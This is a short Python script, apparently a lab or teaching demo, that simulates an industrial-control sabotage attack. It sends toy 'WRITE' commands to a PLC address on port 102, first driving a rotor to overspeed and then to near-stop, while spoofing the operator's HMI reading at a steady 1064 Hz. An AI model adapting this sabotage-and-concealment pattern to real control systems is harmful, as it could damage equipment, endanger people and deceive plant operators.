import socket
import time
import struct

PLC_IP = "192.168.234.130"
PORT = 102


def send_payload(target_hz, spoof_hz):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)

    try:
        s.connect((PLC_IP, PORT))

        payload = b"WRITE" + struct.pack(">HH", target_hz, spoof_hz)

        s.sendall(payload)

        response = s.recv(1024)

        if response == b"ACK":
            print(f"[+] PLC accepted WRITE: Rotor={target_hz} Hz | HMI={spoof_hz} Hz")
        else:
            print(f"[!] Unexpected PLC response: {response!r}")

    finally:
        s.close()


print("[*] Infiltrating simulated SCADA network...")
time.sleep(1)

print("[*] Sending simulated malicious PLC write...")

# Phase 1 — simulated overspeed
print("[!] Phase 1: Rotor = 1410 Hz | HMI spoof = 1064 Hz")
send_payload(1410, 1064)

time.sleep(8)

# Phase 2 — simulated deceleration
print("[!] Phase 2: Rotor = 2 Hz | HMI spoof = 1064 Hz")
send_payload(2, 1064)

time.sleep(4)

print("[+] Simulation complete.")
print("[+] HMI telemetry remained spoofed at 1064 Hz.")
